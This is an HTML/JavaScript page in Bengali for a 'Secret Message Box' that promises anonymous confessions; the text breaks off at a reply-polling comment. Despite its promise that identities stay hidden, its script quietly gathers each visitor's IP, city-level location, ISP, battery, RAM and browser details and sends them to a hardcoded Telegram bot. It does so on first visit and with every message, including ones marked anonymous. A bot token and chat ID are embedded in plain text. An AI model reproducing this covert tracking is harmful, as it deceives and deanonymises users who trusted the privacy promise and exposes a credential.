<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>💌 Secret Message Box</title>
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,400&family=Dancing+Script:wght@700&family=Raleway:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>
  :root {
    --rose: #ff3b6b;
    --pink: #ff6b9d;
    --gold: #ffd700;
    --deep: #1a0010;
    --card: rgba(255,255,255,0.06);
    --glass: rgba(255,255,255,0.10);
  }

  * { margin:0; padding:0; box-sizing:border-box; }

  body {
    min-height: 100vh;
    background: linear-gradient(135deg, #0d0010 0%, #1a0028 40%, #0d0018 70%, #1a0010 100%);
    font-family: 'Raleway', sans-serif;
    overflow-x: hidden;
    position: relative;
  }

  /* ── Floating hearts BG ── */
  .hearts-bg {
    position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden;
  }
  .hb { position: absolute; opacity: 0; font-size: 1.4rem; animation: floatHeart linear infinite; }
  @keyframes floatHeart {
    0%   { transform: translateY(110vh) rotate(0deg); opacity: 0; }
    10%  { opacity: 0.35; }
    90%  { opacity: 0.2; }
    100% { transform: translateY(-10vh) rotate(720deg); opacity: 0; }
  }

  /* ── RGB border glow ── */
  @keyframes rgbBorder {
    0%   { border-color: #ff0040; box-shadow: 0 0 20px #ff0040, inset 0 0 20px rgba(255,0,64,.08); }
    16%  { border-color: #ff6b00; box-shadow: 0 0 20px #ff6b00, inset 0 0 20px rgba(255,107,0,.08); }
    33%  { border-color: #ffe000; box-shadow: 0 0 20px #ffe000, inset 0 0 20px rgba(255,224,0,.08); }
    50%  { border-color: #00e676; box-shadow: 0 0 20px #00e676, inset 0 0 20px rgba(0,230,118,.08); }
    66%  { border-color: #00bfff; box-shadow: 0 0 20px #00bfff, inset 0 0 20px rgba(0,191,255,.08); }
    83%  { border-color: #a855f7; box-shadow: 0 0 20px #a855f7, inset 0 0 20px rgba(168,85,247,.08); }
    100% { border-color: #ff0040; box-shadow: 0 0 20px #ff0040, inset 0 0 20px rgba(255,0,64,.08); }
  }
  @keyframes rgbText {
    0%   { color: #ff6b9d; }
    25%  { color: #ffd700; }
    50%  { color: #00e5ff; }
    75%  { color: #a855f7; }
    100% { color: #ff6b9d; }
  }
  @keyframes rgbBtn {
    0%   { background-position: 0% 50%; }
    50%  { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }
  @keyframes pulse { 0%,100%{transform:scale(1);}50%{transform:scale(1.06);} }
  @keyframes shimmer {
    0%  { background-position: -200% center; }
    100%{ background-position:  200% center; }
  }
  @keyframes fadeIn  { from{opacity:0;transform:translateY(30px);}to{opacity:1;transform:translateY(0);} }
  @keyframes popIn   { 0%{transform:scale(.5);opacity:0;}80%{transform:scale(1.05);}100%{transform:scale(1);opacity:1;} }
  @keyframes slideDown{ from{transform:translateY(-40px);opacity:0;}to{transform:translateY(0);opacity:1;} }

  /* ── Main wrapper ── */
  .wrapper {
    position: relative; z-index: 1;
    min-height: 100vh;
    display: flex; flex-direction: column; align-items: center;
    padding: 20px 16px 60px;
  }

  /* ── Top 3-dot menu ── */
  .top-menu {
    width: 100%; max-width: 700px;
    display: flex; justify-content: flex-end; align-items: center;
    margin-bottom: 10px;
    animation: slideDown .7s ease;
  }
  .dot-menu-btn {
    background: var(--glass);
    border: 2px solid rgba(255,255,255,.18);
    border-radius: 50px;
    padding: 8px 18px;
    color: #fff;
    font-family: 'Raleway', sans-serif;
    font-weight: 700;
    font-size: .9rem;
    cursor: pointer;
    display: flex; align-items: center; gap: 8px;
    animation: rgbBorder 3s linear infinite;
    transition: transform .2s;
    letter-spacing: 1px;
  }
  .dot-menu-btn:hover { transform: scale(1.05); }
  .dot-menu-btn .dots {
    display: flex; gap: 4px;
  }
  .dot-menu-btn .dots span {
    width: 7px; height: 7px; border-radius: 50%;
    display: inline-block;
    animation: rgbText 2s linear infinite;
    background: currentColor;
  }
  .dot-menu-btn .dots span:nth-child(2){ animation-delay:.3s; }
  .dot-menu-btn .dots span:nth-child(3){ animation-delay:.6s; }

  .dropdown {
    position: absolute; top: 56px; right: 0;
    background: rgba(20,0,30,.97);
    border: 2px solid rgba(255,107,157,.4);
    border-radius: 16px;
    padding: 10px 0;
    z-index: 999;
    min-width: 220px;
    box-shadow: 0 20px 60px rgba(0,0,0,.6);
    display: none;
  }
  .dropdown.open { display: block; animation: popIn .3s ease; }
  .dropdown a {
    display: flex; align-items: center; gap: 10px;
    padding: 12px 20px;
    color: #fff; text-decoration: none;
    font-weight: 600; font-size: .9rem;
    transition: background .2s;
  }
  .dropdown a:hover { background: rgba(255,107,157,.15); }

  /* ── Main card ── */
  .card {
    width: 100%; max-width: 700px;
    background: var(--card);
    backdrop-filter: blur(20px);
    border: 2.5px solid transparent;
    border-radius: 28px;
    padding: 36px 32px 40px;
    animation: fadeIn .9s ease, rgbBorder 4s linear infinite;
    position: relative;
  }

  /* ── Header ── */
  .header { text-align: center; margin-bottom: 32px; }
  .header-icon { font-size: 3.5rem; animation: pulse 2s ease infinite; display: block; margin-bottom: 8px; }
  .header h1 {
    font-family: 'Dancing Script', cursive;
    font-size: clamp(2rem, 6vw, 3rem);
    background: linear-gradient(90deg, #ff6b9d, #ffd700, #ff6b9d, #a855f7);
    background-size: 300%;
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    animation: shimmer 3s linear infinite, rgbBtn 4s ease infinite;
    line-height: 1.2;
  }
  .header p {
    color: rgba(255,255,255,.65);
    font-size: .95rem; margin-top: 8px;
    font-style: italic;
  }
  .user-id-badge {
    display: inline-flex; align-items: center; gap: 6px;
    background: rgba(255,107,157,.15);
    border: 1.5px solid rgba(255,107,157,.4);
    border-radius: 50px;
    padding: 5px 16px;
    font-size: .8rem;
    color: #ff9cbf;
    margin-top: 12px;
    font-weight: 700;
    letter-spacing: 1px;
  }

  /* ── Section label ── */
  .section-label {
    font-size: .78rem;
    font-weight: 800;
    letter-spacing: 2px;
    text-transform: uppercase;
    animation: rgbText 3s linear infinite;
    margin-bottom: 6px;
    display: block;
  }

  /* ── Input groups ── */
  .form-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
    margin-bottom: 16px;
  }
  @media(max-width:500px){ .form-grid{ grid-template-columns:1fr; } }

  .field { display: flex; flex-direction: column; gap: 6px; }
  .field label {
    font-size: .8rem; font-weight: 700;
    color: rgba(255,255,255,.7);
    letter-spacing: .5px;
  }
  .field input {
    background: rgba(255,255,255,.07);
    border: 1.5px solid rgba(255,255,255,.15);
    border-radius: 12px;
    padding: 13px 16px;
    color: #fff;
    font-family: 'Raleway', sans-serif;
    font-size: .95rem;
    outline: none;
    transition: border-color .3s, box-shadow .3s;
  }
  .field input:focus {
    border-color: #ff6b9d;
    box-shadow: 0 0 16px rgba(255,107,157,.35);
  }
  .field input::placeholder { color: rgba(255,255,255,.3); }

  /* ── Anonymous option ── */
  .anon-box {
    background: rgba(255,59,107,.07);
    border: 2px solid rgba(255,59,107,.3);
    border-radius: 14px;
    padding: 14px 18px;
    margin-bottom: 20px;
    display: flex; align-items: center; gap: 14px;
    cursor: pointer;
    transition: background .2s;
  }
  .anon-box:hover { background: rgba(255,59,107,.13); }
  .anon-box input[type=checkbox] { display:none; }
  .custom-check {
    width: 26px; height: 26px; min-width: 26px;
    border: 2.5px solid #ff3b6b;
    border-radius: 7px;
    display: flex; align-items: center; justify-content: center;
    font-size: 1.1rem;
    transition: all .2s;
    background: transparent;
  }
  .custom-check.checked {
    background: linear-gradient(135deg,#ff3b6b,#ff6b9d);
    border-color: #ff3b6b;
  }
  .anon-text { flex: 1; }
  .anon-text strong {
    display: block;
    font-size: .95rem; font-weight: 800;
    color: #ff6b9d;
  }
  .anon-text small {
    font-size: .78rem; color: rgba(255,255,255,.5);
  }
  .red-mark {
    background: linear-gradient(135deg,#ff0040,#ff3b6b);
    color: #fff !important;
    border-radius: 6px;
    padding: 2px 8px;
    font-size: .72rem !important;
    font-weight: 800 !important;
    letter-spacing: 1px;
    animation: pulse 1.5s ease infinite;
  }

  /* ── Message box ── */
  .msg-wrap {
    position: relative;
    margin-bottom: 24px;
  }
  .msg-frame {
    border: 2.5px solid transparent;
    border-radius: 20px;
    padding: 3px;
    background: linear-gradient(var(--deep),var(--deep)) padding-box,
                linear-gradient(135deg,#ff3b6b,#ffd700,#00e5ff,#a855f7,#ff3b6b) border-box;
    animation: rgbBtn 3s ease infinite;
    background-size: 300% 300%;
  }
  .msg-inner {
    background: rgba(10,0,20,.8);
    border-radius: 17px;
    padding: 20px;
    position: relative;
  }
  .msg-inner::before {
    content: '💌 তোমার গোপন চিঠি...';
    position: absolute; top: -10px; left: 20px;
    background: linear-gradient(90deg,#ff3b6b,#ffd700);
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    font-size: .75rem; font-weight: 800; letter-spacing: 1px;
  }
  .msg-frame textarea {
    width: 100%;
    min-height: 220px;
    background: transparent;
    border: none; outline: none;
    color: #fff;
    font-family: 'Dancing Script', cursive;
    font-size: 1.25rem;
    line-height: 1.8;
    resize: vertical;
    letter-spacing: .5px;
  }
  .msg-frame textarea::placeholder {
    color: rgba(255,255,255,.2);
    font-family: 'Raleway', sans-serif;
    font-size: 1rem;
    font-style: italic;
  }
  .char-count {
    text-align: right;
    font-size: .78rem;
    color: rgba(255,255,255,.3);
    margin-top: 8px;
  }

  /* ── Send button ── */
  .send-btn {
    width: 100%;
    padding: 18px;
    border: none; border-radius: 16px;
    font-family: 'Dancing Script', cursive;
    font-size: 1.5rem;
    font-weight: 700;
    color: #fff;
    cursor: pointer;
    background: linear-gradient(270deg, #ff0040, #ff6b00, #ffe000, #00e676, #00bfff, #a855f7, #ff0040);
    background-size: 400% 400%;
    animation: rgbBtn 3s ease infinite;
    letter-spacing: 1px;
    transition: transform .2s, box-shadow .2s;
    box-shadow: 0 8px 32px rgba(255,59,107,.4);
    position: relative; overflow: hidden;
  }
  .send-btn::before {
    content: '';
    position: absolute; inset: 0;
    background: linear-gradient(90deg,transparent,rgba(255,255,255,.15),transparent);
    transform: translateX(-100%);
    transition: transform .5s;
  }
  .send-btn:hover::before { transform: translateX(100%); }
  .send-btn:hover { transform: translateY(-3px); box-shadow: 0 14px 40px rgba(255,59,107,.6); }
  .send-btn:active { transform: scale(.97); }

  /* ── History modal ── */
  .modal-overlay {
    position: fixed; inset: 0;
    background: rgba(0,0,0,.85);
    backdrop-filter: blur(10px);
    z-index: 9998;
    display: none; align-items: center; justify-content: center;
    padding: 16px;
  }
  .modal-overlay.open { display: flex; }
  .modal {
    background: linear-gradient(135deg,#0d0010 0%,#1a0028 100%);
    border: 2px solid rgba(255,107,157,.4);
    border-radius: 24px;
    padding: 28px 24px;
    width: 100%; max-width: 540px;
    max-height: 80vh;
    overflow-y: auto;
    animation: popIn .4s ease;
    position: relative;
  }
  .modal h2 {
    font-family: 'Dancing Script', cursive;
    font-size: 1.8rem;
    animation: rgbText 3s linear infinite;
    margin-bottom: 18px;
    text-align: center;
  }
  .modal-close {
    position: absolute; top: 16px; right: 16px;
    background: rgba(255,59,107,.2);
    border: 1.5px solid #ff3b6b;
    border-radius: 50%;
    width: 34px; height: 34px;
    color: #fff; font-size: 1.1rem;
    cursor: pointer; display:flex;align-items:center;justify-content:center;
  }
  .msg-item {
    background: rgba(255,255,255,.05);
    border: 1px solid rgba(255,107,157,.2);
    border-radius: 14px;
    padding: 14px;
    margin-bottom: 12px;
  }
  .msg-item .msg-type {
    font-size: .7rem; font-weight: 800; letter-spacing: 1px;
    text-transform: uppercase;
    animation: rgbText 3s linear infinite;
    margin-bottom: 6px;
  }
  .msg-item .msg-text { color: #fff; font-size: .95rem; line-height: 1.6; }
  .msg-item .msg-time { font-size: .72rem; color: rgba(255,255,255,.35); margin-top: 6px; }
  .empty-state { text-align:center; color:rgba(255,255,255,.3); padding:30px 0; font-size:.9rem; }

  /* ── Reply popup ── */
  #reply-popup {
    position: fixed; inset: 0;
    background: rgba(0,0,0,.88);
    backdrop-filter: blur(12px);
    z-index: 9999;
    display: none; align-items: center; justify-content: center;
    padding: 16px;
  }
  #reply-popup.show { display: flex; animation: fadeIn .5s ease; }
  .reply-card {
    background: linear-gradient(135deg,#0d0010,#1a0028);
    border: 2px solid #ff6b9d;
    border-radius: 28px;
    padding: 32px 28px;
    max-width: 480px; width: 100%;
    animation: popIn .4s ease;
    text-align: center;
    position: relative;
    box-shadow: 0 0 60px rgba(255,107,157,.3);
  }
  .reply-card::before {
    content: ''; position:absolute; inset:-1px;
    border-radius: 29px;
    background: linear-gradient(135deg,#ff3b6b,#ffd700,#00e5ff,#a855f7);
    z-index:-1; animation: rgbBtn 3s ease infinite; background-size:300% 300%;
  }
  .reply-card h3 {
    font-family: 'Dancing Script', cursive;
    font-size: 1.8rem;
    animation: rgbText 3s linear infinite;
    margin-bottom: 6px;
  }
  .reply-card .reply-from {
    font-size: .8rem; color: rgba(255,255,255,.5);
    margin-bottom: 16px; font-style: italic;
  }
  .reply-card .reply-body {
    background: rgba(255,255,255,.07);
    border: 1px solid rgba(255,107,157,.3);
    border-radius: 14px;
    padding: 16px;
    color: #fff;
    font-family: 'Dancing Script', cursive;
    font-size: 1.2rem;
    line-height: 1.8;
    text-align: left;
    margin-bottom: 16px;
  }
  .reply-card .reply-time {
    font-size: .75rem; color: rgba(255,255,255,.35);
    margin-bottom: 20px;
  }
  .reply-close-btn {
    background: linear-gradient(135deg,#ff3b6b,#a855f7);
    border: none; border-radius: 12px;
    padding: 12px 32px;
    color: #fff; font-family:'Raleway',sans-serif;
    font-weight: 800; font-size: 1rem;
    cursor: pointer;
    transition: transform .2s;
  }
  .reply-close-btn:hover { transform: scale(1.05); }

  /* ── Success popup ── */
  #success-popup {
    position: fixed; inset:0;
    background: rgba(0,0,0,.88);
    backdrop-filter: blur(12px);
    z-index: 10000;
    display:none; align-items:center; justify-content:center;
    padding:16px;
  }
  #success-popup.show { display:flex; animation:fadeIn .4s ease; }
  .success-card {
    background: linear-gradient(135deg,#0d001a,#1a0028);
    border-radius: 28px;
    padding: 40px 32px;
    max-width: 420px; width:100%;
    text-align: center;
    animation: popIn .5s ease;
    position: relative;
    border: 2px solid transparent;
    animation: rgbBorder 3s linear infinite, popIn .5s ease;
  }
  .success-icon { font-size: 4rem; animation: pulse 1s ease infinite; }
  .success-card h2 {
    font-family: 'Dancing Script', cursive;
    font-size: 2rem;
    animation: rgbText 3s linear infinite;
    margin: 12px 0 8px;
  }
  .success-card p { color: rgba(255,255,255,.65); font-size:.95rem; line-height:1.6; }
  .success-dismiss {
    display: inline-block;
    margin-top: 22px;
    background: linear-gradient(270deg,#ff0040,#ffd700,#00e5ff,#a855f7,#ff0040);
    background-size: 300%;
    animation: rgbBtn 3s ease infinite;
    border: none; border-radius: 14px;
    padding: 13px 36px;
    color: #fff;
    font-family: 'Dancing Script', cursive;
    font-size: 1.3rem;
    cursor: pointer;
    transition: transform .2s;
  }
  .success-dismiss:hover { transform: scale(1.05); }

  /* ── Notif banner ── */
  #notif-banner {
    position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
    background: rgba(20,0,30,.95);
    border: 2px solid #ff6b9d;
    border-radius: 16px;
    padding: 14px 24px;
    display: none; align-items: center; gap: 14px;
    max-width: 380px; width: calc(100% - 32px);
    z-index: 10001;
    box-shadow: 0 10px 40px rgba(0,0,0,.5);
    animation: slideDown .4s ease;
  }
  #notif-banner.show { display: flex; }
  #notif-banner .nb-icon { font-size: 1.8rem; }
  #notif-banner .nb-text { flex:1; }
  #notif-banner .nb-text strong { display:block; color:#ff9cbf; font-size:.9rem; }
  #notif-banner .nb-text span { color:rgba(255,255,255,.5); font-size:.8rem; }
  #notif-banner .nb-allow {
    background: linear-gradient(135deg,#ff3b6b,#a855f7);
    border: none; border-radius: 10px;
    padding: 8px 16px;
    color:#fff; font-weight:800; font-size:.82rem;
    cursor:pointer;
  }
  #notif-banner .nb-close {
    background:transparent; border:none;
    color:rgba(255,255,255,.4); font-size:1.2rem; cursor:pointer;
  }

  /* scrollbar */
  ::-webkit-scrollbar { width:6px; }
  ::-webkit-scrollbar-track { background:rgba(255,255,255,.05); }
  ::-webkit-scrollbar-thumb { background:rgba(255,107,157,.4); border-radius:3px; }

  /* ── top menu relative wrapper ── */
  .top-menu-wrap { position:relative; width:100%; max-width:700px; margin-bottom:10px; display:flex; justify-content:flex-end; }
</style>
</head>
<body>

<!-- Floating hearts -->
<div class="hearts-bg" id="heartsBg"></div>

<!-- Notification banner -->
<div id="notif-banner">
  <span class="nb-icon">🔔</span>
  <div class="nb-text">
    <strong>Notification চালু করো!</strong>
    <span>Reply পেলে সাথে সাথে জানতে পারবে 💌</span>
  </div>
  <button class="nb-allow" onclick="requestNotif()">Allow</button>
  <button class="nb-close" onclick="closeNotifBanner()">✕</button>
</div>

<!-- Reply popup (one-time) -->
<div id="reply-popup">
  <div class="reply-card">
    <h3>💌 তোমার কাছে Reply এসেছে!</h3>
    <p class="reply-from">প্রেরক: Secret Messenger</p>
    <div class="reply-body" id="reply-body-text"></div>
    <p class="reply-time" id="reply-time-text"></p>
    <button class="reply-close-btn" onclick="closeReplyPopup()">✓ দেখা হয়েছে, বন্ধ করো</button>
  </div>
</div>

<!-- Success popup -->
<div id="success-popup">
  <div class="success-card">
    <div class="success-icon">💌</div>
    <h2>Message পাঠানো হয়েছে!</h2>
    <p>তোমার গোপন চিঠি সফলভাবে পৌঁছে গেছে ✨<br>তুমি চাইলে reply পাবে তোমার User ID তে!</p>
    <button class="success-dismiss" onclick="closeSuccess()">🌹 ঠিক আছে, ধন্যবাদ!</button>
  </div>
</div>

<!-- History modal -->
<div class="modal-overlay" id="historyModal">
  <div class="modal">
    <button class="modal-close" onclick="closeModal('historyModal')">✕</button>
    <h2 id="modal-title">📜 History</h2>
    <div id="modal-content"></div>
  </div>
</div>

<div class="wrapper">

  <!-- Top 3-dot menu -->
  <div class="top-menu-wrap">
    <div style="position:relative;">
      <button class="dot-menu-btn" onclick="toggleDropdown()">
        <div class="dots"><span></span><span></span><span></span></div>
        Help &amp; History
      </button>
      <div class="dropdown" id="dropdown">
        <a href="#" onclick="showSentHistory(); return false;">📤 Messages Send History</a>
        <a href="#" onclick="showReceivedHistory(); return false;">📥 Message Receive History</a>
        <a href="#" onclick="closeDropdown();">ℹ️ About This Page</a>
      </div>
    </div>
  </div>

  <!-- Main card -->
  <div class="card">
    <!-- Header -->
    <div class="header">
      <span class="header-icon">💝</span>
      <h1>Secret Message Box</h1>
      <p>পরিচয় গোপন রেখে অথবা নিজের আসল পরিচয়ে চিঠি লিখে পাঠাও 🌹</p>
      <div class="user-id-badge">🆔 তোমার User ID: <strong id="uid-display">...</strong></div>
    </div>

    <!-- Info section -->
    <span class="section-label">👤 প্রেরকের তথ্য</span>

    <!-- Anonymous checkbox -->
    <div class="anon-box" onclick="toggleAnon()">
      <div class="custom-check" id="anonCheck">✓</div>
      <div class="anon-text">
        <strong>🕵️ পরিচয় গোপন রাখো <span class="red-mark">DEFAULT: Unknown</span></strong>
        <small>টিক দিলে তোমার নাম, নম্বর ও FB ID — Unknown / Hidden হয়ে যাবে</small>
      </div>
    </div>

    <div class="form-grid" id="infoFields">
      <div class="field">
        <label>✏️ তোমার নাম</label>
        <input type="text" id="senderName" placeholder="যেকোনো নাম দাও...">
      </div>
      <div class="field">
        <label>📞 Phone Number</label>
        <input type="tel" id="senderPhone" placeholder="+880 XXXXXXXXX">
      </div>
      <div class="field" style="grid-column:1/-1">
        <label>🔗 Facebook ID Link <span style="opacity:.5;font-weight:400;">(optional)</span></label>
        <input type="url" id="senderFb" placeholder="https://facebook.com/...">
      </div>
    </div>

    <!-- Message box -->
    <span class="section-label" style="margin-bottom:10px;">💌 তোমার গোপন চিঠি</span>
    <div class="msg-wrap">
      <div class="msg-frame">
        <div class="msg-inner">
          <textarea id="msgText" placeholder="এখানে তোমার মনের কথা লিখো...&#10;&#10;যা বলতে পারোনি, যা মনে জমে আছে —&#10;সবকিছু নিঃসংকোচে লিখে ফেলো 🌹&#10;&#10;তোমার পরিচয় সম্পূর্ণ গোপন থাকবে 🔒" oninput="updateCharCount()"></textarea>
          <div class="char-count"><span id="charCount">0</span> / 4000</div>
        </div>
      </div>
    </div>

    <!-- Send button -->
    <button class="send-btn" onclick="sendMessage()">
      💌 গোপন চিঠি পাঠাও 🕊️
    </button>
  </div>
</div>

<script>
// ──────────────────────────────────────────────
// CONFIG — replace with your real values
// ──────────────────────────────────────────────
const BOT_TOKEN   = '8653934604:AAGE9O4iEkB62yxsXWEGOE2AS_TZNmmMxPA';
const OWNER_CHAT  = '6048050987';
const TG_API      = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ──────────────────────────────────────────────
// Floating hearts
// ──────────────────────────────────────────────
const hBg = document.getElementById('heartsBg');
const hArr = ['💕','💗','💖','💓','🌹','💝','✨','💫','🌸'];
for(let i=0;i<28;i++){
  const h=document.createElement('div');
  h.className='hb';
  h.textContent=hArr[Math.floor(Math.random()*hArr.length)];
  h.style.cssText=`left:${Math.random()*100}%;font-size:${.9+Math.random()*1.6}rem;animation-duration:${7+Math.random()*12}s;animation-delay:${Math.random()*12}s;`;
  hBg.appendChild(h);
}

// ──────────────────────────────────────────────
// User ID — permanent cookie
// ──────────────────────────────────────────────
function getCookie(k){
  const m=document.cookie.match(new RegExp('(^| )'+k+'=([^;]+)'));
  return m?m[2]:null;
}
function setCookie(k,v,days){
  const d=new Date(); d.setTime(d.getTime()+days*864e5);
  document.cookie=`${k}=${v};expires=${d.toUTCString()};path=/;SameSite=Lax`;
}
function genUID(){
  return String(Math.floor(100+Math.random()*900));
}
let myUID = getCookie('smb_uid');
if(!myUID){ myUID=genUID(); setCookie('smb_uid',myUID,3650); sendNewUserAlert(); }
document.getElementById('uid-display').textContent = '#'+myUID;

// ──────────────────────────────────────────────
// Anonymous toggle
// ──────────────────────────────────────────────
let isAnon = false; // default NOT checked
function toggleAnon(){
  isAnon=!isAnon;
  const c=document.getElementById('anonCheck');
  c.classList.toggle('checked',isAnon);
  c.textContent=isAnon?'✓':'';
  const fields=document.getElementById('infoFields');
  fields.style.opacity=isAnon?'0.3':'1';
  fields.style.pointerEvents=isAnon?'none':'auto';
}

// ──────────────────────────────────────────────
// Char count
// ──────────────────────────────────────────────
function updateCharCount(){
  const v=document.getElementById('msgText').value.length;
  document.getElementById('charCount').textContent=v;
}

// ──────────────────────────────────────────────
// Dropdown
// ──────────────────────────────────────────────
function toggleDropdown(){ document.getElementById('dropdown').classList.toggle('open'); }
function closeDropdown(){ document.getElementById('dropdown').classList.remove('open'); }
document.addEventListener('click',e=>{ if(!e.target.closest('.dot-menu-btn')&&!e.target.closest('.dropdown')) closeDropdown(); });

// ──────────────────────────────────────────────
// Get device & geo info (best-effort)
// ──────────────────────────────────────────────
async function getDeviceInfo(){
  let info = {
    ua: navigator.userAgent,
    lang: navigator.language,
    platform: navigator.platform||'Unknown',
    screen: `${screen.width}x${screen.height}`,
    cores: navigator.hardwareConcurrency||'?',
    memory: navigator.deviceMemory?`~${navigator.deviceMemory}GB RAM`:'Unknown RAM',
    battery: 'Unknown',
    ip: 'Fetching...',
    location: 'Fetching...',
    isp: 'Fetching...',
    time: new Date().toLocaleString('bn-BD',{timeZone:'Asia/Dhaka',hour12:true}),
  };
  // Battery
  try{
    const b=await navigator.getBattery();
    info.battery=`${Math.round(b.level*100)}% ${b.charging?'⚡ Charging':'🔋 Discharging'}`;
  }catch(e){}
  // IP + Geo
  try{
    const r=await fetch('https://ipapi.co/json/');
    const d=await r.json();
    info.ip=d.ip||'?';
    info.location=`${d.country_name||''} › ${d.region||''} › ${d.city||''}`;
    info.isp=d.org||'?';
  }catch(e){
    try{
      const r=await fetch('https://api.ipify.org?format=json');
      const d=await r.json();
      info.ip=d.ip||'?';
    }catch(e2){}
  }
  return info;
}

// ──────────────────────────────────────────────
// Send NEW USER ALERT to bot
// ──────────────────────────────────────────────
async function sendNewUserAlert(){
  const info = await getDeviceInfo();
  const txt =
`🆕 ═══════════════════════
🔔 *NEW USER ALERT!*
═══════════════════════
🆔 *User ID:* \`#${myUID}\`
📅 *Time:* ${info.time}
═══════════════════════
🌐 *IP Address:* \`${info.ip}\`
📍 *Location:* ${info.location}
🛜 *ISP:* ${info.isp}
═══════════════════════
📱 *Device Info:*
• Model/UA: \`${info.ua.substring(0,120)}\`
• Platform: ${info.platform}
• Screen: ${info.screen}
• Cores: ${info.cores}
• RAM: ${info.memory}
• Battery: ${info.battery}
• Language: ${info.lang}
═══════════════════════`;
  await tgSend(txt, null, true);
}

// ──────────────────────────────────────────────
// Core Telegram send
// ──────────────────────────────────────────────
async function tgSend(text, replyMarkup=null, silent=false){
  const body={
    chat_id: OWNER_CHAT,
    text,
    parse_mode:'Markdown',
    disable_notification: silent
  };
  if(replyMarkup) body.reply_markup=replyMarkup;
  const r=await fetch(`${TG_API}/sendMessage`,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(body)
  });
  return r.json();
}

// ──────────────────────────────────────────────
// Send message
// ──────────────────────────────────────────────
async function sendMessage(){
  const msg=document.getElementById('msgText').value.trim();
  if(!msg){ alert('💌 বার্তা খালি রাখা যাবে না! মনের কথাটি লিখো...'); return; }

  let name='Unknown 🕵️', phone='Hidden 📵', fb='Hidden 🔒';
  if(!isAnon){
    name = document.getElementById('senderName').value.trim()||'Unknown';
    phone= document.getElementById('senderPhone').value.trim()||'Not given';
    fb   = document.getElementById('senderFb').value.trim()||'Not given';
  }

  const info = await getDeviceInfo();
  const now  = new Date().toLocaleString('bn-BD',{timeZone:'Asia/Dhaka',hour12:true});

  const fullMsg =
`💌 ═══════════════════════
💝 *SECRET MESSAGE RECEIVED!*
═══════════════════════
🆔 *User ID:* \`#${myUID}\`
📅 *Sent At:* ${now}
═══════════════════════
👤 *Sender Info:*
• 🏷️ Name: ${name}
• 📞 Phone: ${phone}
• 🔗 FB: ${fb}
═══════════════════════
🌐 *IP:* \`${info.ip}\`
📍 *Location:* ${info.location}
🛜 *ISP:* ${info.isp}
📱 *Battery:* ${info.battery}
💻 *Device:* ${info.memory} | ${info.screen}
🌐 *Browser:* \`${info.ua.substring(0,100)}\`
═══════════════════════
✉️ *MESSAGE:*

${msg}

═══════════════════════`;

  const replyMarkup={
    inline_keyboard:[[{
      text:`💬 Reply to #${myUID}`,
      callback_data:`reply_${myUID}`
    }]]
  };

  try{
    const res=await tgSend(fullMsg, replyMarkup);
    if(res.ok){
      // Save sent history
      saveSentMsg(msg, name, now);
      showSuccess();
      document.getElementById('msgText').value='';
      updateCharCount();
    } else {
      alert('❌ Error! Bot token বা Chat ID চেক করো।');
    }
  }catch(e){
    alert('❌ Network error! Internet connection চেক করো।');
  }
}

// ──────────────────────────────────────────────
// History storage
// ──────────────────────────────────────────────
function saveSentMsg(msg, name, time){
  let hist=JSON.parse(localStorage.getItem('smb_sent')||'[]');
  hist.unshift({msg,name,time});
  if(hist.length>50) hist=hist.slice(0,50);
  localStorage.setItem('smb_sent',JSON.stringify(hist));
}
function saveReceivedMsg(msg, time){
  let hist=JSON.parse(localStorage.getItem('smb_recv')||'[]');
  hist.unshift({msg,time});
  if(hist.length>50) hist=hist.slice(0,50);
  localStorage.setItem('smb_recv',JSON.stringify(hist));
}

function showSentHistory(){
  closeDropdown();
  const hist=JSON.parse(localStorage.getItem('smb_sent')||'[]');
  document.getElementById('modal-title').textContent='📤 Messages Send History';
  const c=document.getElementById('modal-content');
  if(!hist.length){ c.innerHTML='<div class="empty-state">💨 এখনো কোনো message পাঠাওনি...</div>'; }
  else{
    c.innerHTML=hist.map(h=>`
      <div class="msg-item">
        <div class="msg-type">📤 Sent</div>
        <div class="msg-text">${escHtml(h.msg)}</div>
        <div class="msg-time">👤 ${escHtml(h.name)} &nbsp;•&nbsp; 🕐 ${h.time}</div>
      </div>`).join('');
  }
  document.getElementById('historyModal').classList.add('open');
}
function showReceivedHistory(){
  closeDropdown();
  const hist=JSON.parse(localStorage.getItem('smb_recv')||'[]');
  document.getElementById('modal-title').textContent='📥 Message Receive History';
  const c=document.getElementById('modal-content');
  if(!hist.length){ c.innerHTML='<div class="empty-state">📭 এখনো কোনো reply আসেনি...</div>'; }
  else{
    c.innerHTML=hist.map(h=>`
      <div class="msg-item">
        <div class="msg-type">📥 Received</div>
        <div class="msg-text">${escHtml(h.msg)}</div>
        <div class="msg-time">🕐 ${h.time}</div>
      </div>`).join('');
  }
  document.getElementById('historyModal').classList.add('open');
}
function closeModal(id){ document.getElementById(id).classList.remove('open'); }
function escHtml(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

// ──────────────────────────────────────────────
// Success popup
// ──────────────────────────────────────────────
function showSuccess(){ document.getElementById('success-popup').classList.add('show'); }
function closeSuccess(){ document.getElementById('success-popup').classList.remove('show'); }

// ──────────────────────────────────────────────
// Notification
// ──────────────────────────────────────────────
function requestNotif(){
  closeNotifBanner();
  if(!('Notification' in window)){ alert('তোমার browser notification support করে না।'); return; }
  Notification.requestPermission().then(p=>{
    if(p==='granted') new Notification('💌 Notification চালু হয়েছে!',{
      body:'Reply পেলে সাথে সাথে জানতে পারবে!',
      icon:'https://emojicdn.elk.sh/💌'
    });
  });
}
function closeNotifBanner(){ document.getElementById('notif-banner').classList.remove('show'); }
// Show notif banner after 4s if not granted
setTimeout(()=>{
  if('Notification' in window && Notification.permission!=='granted'){
    document.getElementById('notif-banner').classList.add('show');
  }
},4000);

// ──────────────────────────────────────────────
// Reply polling (check for reply from bot)
// Every 30s, check localStorage for new reply
